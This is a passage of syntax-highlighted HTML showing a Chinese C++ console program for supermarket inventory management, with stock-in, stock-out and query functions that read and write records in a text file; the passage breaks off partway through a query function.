class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//仓库管理员类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">admin();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//仓库货架类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shelf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">shelf();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">admin men;<span class="comment">//管理员</span></span><br><span class="line"><span class="built_in">string</span> storeNo;<span class="comment">//仓库编号</span></span><br><span class="line"><span class="built_in">string</span> kinds;<span class="comment">//生产产地</span></span><br><span class="line"><span class="built_in">string</span> shelfNo;<span class="comment">//货架号</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//electrical class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ele</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">ele();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="built_in">string</span> name;<span class="comment">//商品名</span></span><br><span class="line"><span class="keyword">double</span> price;<span class="comment">//价格</span></span><br><span class="line">shelf sh;<span class="comment">//所属货架</span></span><br><span class="line"><span class="keyword">long</span> count;<span class="comment">//商品数量</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//管理(组合类)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mana</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">mana();</span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">first_face</span><span class="params">()</span></span>;<span class="comment">//首页</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">in_storage</span><span class="params">()</span></span>;<span class="comment">//入库</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">out_storage</span><span class="params">()</span></span>;<span class="comment">// 出库</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_ele</span><span class="params">()</span></span>;<span class="comment">//查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_name</span><span class="params">()</span></span>;<span class="comment">//按商品名称查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_price</span><span class="params">()</span></span>;<span class="comment">//按商品价格查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_kind</span><span class="params">()</span></span>;<span class="comment">//按产地查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call_break</span><span class="params">()</span></span>;<span class="comment">//商品报损</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">ele aele;</span><br><span class="line">shelf ashelf;</span><br><span class="line">admin <span class="built_in">abs</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电器类默认构造函数</span></span><br><span class="line">ele::ele():sh()</span><br><span class="line">&#123;</span><br><span class="line">name = <span class="string">&quot;xxx&quot;</span>;<span class="comment">//商品名</span></span><br><span class="line">price = <span class="number">0.0</span>;<span class="comment">//价格</span></span><br><span class="line">count = <span class="number">0</span>;<span class="comment">//商品数量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//仓库货架类默认构造函数</span></span><br><span class="line">shelf::shelf():men()</span><br><span class="line">&#123;</span><br><span class="line">storeNo = <span class="string">&quot;xxx&quot;</span>;<span class="comment">//仓库编号</span></span><br><span class="line">kinds = <span class="string">&quot;xxx&quot;</span>;<span class="comment">//生产产地</span></span><br><span class="line">shelfNo = <span class="string">&quot;xxx&quot;</span>;;<span class="comment">//货架号</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//仓库管理员类</span></span><br><span class="line">admin::admin()</span><br><span class="line">&#123;</span><br><span class="line">name = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//管理类默认构造函数</span></span><br><span class="line">mana::mana():aele(), ashelf(), <span class="built_in">abs</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">mana::first_face</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;超市库存货物管理系统&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\t\t&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;\t--------------------------系统菜单显示如下---------------------\t&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t￥￥&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t￥￥ 1. 商品入库 ￥￥&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t￥￥ 2. 商品出库 ￥￥&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t￥￥ 3. 查询统计 ￥￥&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t￥￥ 4. 商品报损 ￥￥&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t￥￥ 5. 退出系统 ￥￥&quot;</span></span><br><span class="line">&lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t---------------------------------------------------&quot;</span> &lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="built_in">endl</span> &lt;&lt;<span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> getch();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//入库</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mana::in_storage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> name;<span class="comment">//商品名</span></span><br><span class="line"><span class="keyword">double</span> price;<span class="comment">//价格</span></span><br><span class="line"><span class="built_in">string</span> storeNo;<span class="comment">//仓库编号</span></span><br><span class="line"><span class="built_in">string</span> kinds;<span class="comment">//生产产地</span></span><br><span class="line"><span class="built_in">string</span> shelfNo;<span class="comment">//货架号</span></span><br><span class="line"><span class="keyword">long</span> count = <span class="number">0</span>; <span class="comment">//商品数量</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;商品入库，请输入相关信息 : &quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t商品名称 : &quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t商品价格 : &quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; price;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t商品数量 : &quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; count;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t仓库编号 : &quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; storeNo;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t生产产地 : &quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; kinds;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t货架编号 : &quot;</span> ;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; shelfNo;</span><br><span class="line"></span><br><span class="line"><span class="function">ofstream <span class="title">storeFile</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>, ios::app)</span></span>;</span><br><span class="line">storeFile &lt;&lt; setiosflags(ios::left) &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; name &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">15</span>) &lt;&lt; price &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; count &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; storeNo &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; kinds &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; shelfNo &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">storeFile.close();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t该商品已经入库.......&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 出库</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mana::out_storage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> name;<span class="comment">//商品名</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t商品出库，输入出库商品信息 : &quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t商品名称 : &quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">storeFile</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!storeFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">storeFile1</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line">storeFile1.close();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t仓存为空!!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">string</span> name1;<span class="comment">//商品名</span></span><br><span class="line"><span class="keyword">double</span> price1;<span class="comment">//价格</span></span><br><span class="line"><span class="built_in">string</span> storeNo1;<span class="comment">//仓库编号</span></span><br><span class="line"><span class="built_in">string</span> kinds1;<span class="comment">//生产产地</span></span><br><span class="line"><span class="built_in">string</span> shelfNo1;<span class="comment">//货架号</span></span><br><span class="line"><span class="keyword">long</span> count1 = <span class="number">0</span>; <span class="comment">//商品数量</span></span><br><span class="line"></span><br><span class="line"><span class="function">ofstream <span class="title">tempFile</span><span class="params">(<span class="string">&quot;j4y.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (storeFile &gt;&gt; name1 &gt;&gt; price1 &gt;&gt; count1 &gt;&gt; storeNo1 &gt;&gt; kinds1 &gt;&gt; shelfNo1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (name1==name)</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">tempFile &lt;&lt; setiosflags(ios::left) &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; name1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">15</span>) &lt;&lt; price1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; count1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; storeNo1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; kinds1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; shelfNo1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">tempFile.close();</span><br><span class="line">storeFile.close();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t仓库中没有这种商品!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>); </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ofstream <span class="title">storeFile1</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">ifstream <span class="title">tempFile1</span><span class="params">(<span class="string">&quot;j4y.txt&quot;</span>)</span></span>;</span><br><span class="line">storeFile1 &lt;&lt; tempFile1.rdbuf();</span><br><span class="line">storeFile1.close();</span><br><span class="line">tempFile1.close();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t这些商品已经出库, 请仔细检查!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mana::select_ele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t=============================================================&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| 商 品 查 询 ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| 1. 按商品名称查询 ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| 2. 按商品价格查询 ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| 3. 按产地查询 ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| 4. 返回 ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t|| ||&quot;</span> &lt;&lt; <span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;\t=============================================================&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> select = getch();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (select)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">select_name();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">select_price();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">select_kind();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按商品名称查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mana::select_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t按商品名查询 : &quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t输入商品名 : &quot;</span>;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> name1;<span class="comment">//商品名</span></span><br><span class="line"><span class="keyword">double</span> price1;<span class="comment">//价格</span></span><br><span class="line"><span class="built_in">string</span> storeNo1;<span class="comment">//仓库编号</span></span><br><span class="line"><span class="built_in">string</span> kinds1;<span class="comment">//生产产地</span></span><br><span class="line"><span class="built_in">string</span> shelfNo1;<span class="comment">//货架号</span></span><br><span class="line"><span class="keyword">long</span> count1 = <span class="number">0</span>; <span class="comment">//商品数量</span></span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">storeFile</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!storeFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t对不起，你的库存为空!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;商品名 &quot;</span> &lt;&lt; <span class="string">&quot;价格 &quot;</span> &lt;&lt; <span class="string">&quot;商品数量 &quot;</span> &lt;&lt; <span class="string">&quot;仓库编号 &quot;</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;生产产地 &quot;</span> &lt;&lt; <span class="string">&quot;货架号&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span> (storeFile &gt;&gt; name1 &gt;&gt; price1 &gt;&gt; count1 &gt;&gt; storeNo1 &gt;&gt; kinds1 &gt;&gt; shelfNo1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (name1 == name)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setiosflags(ios::left) &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; name1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; price1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; count1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; storeNo1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; kinds1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; shelfNo1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">storeFile.close();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span 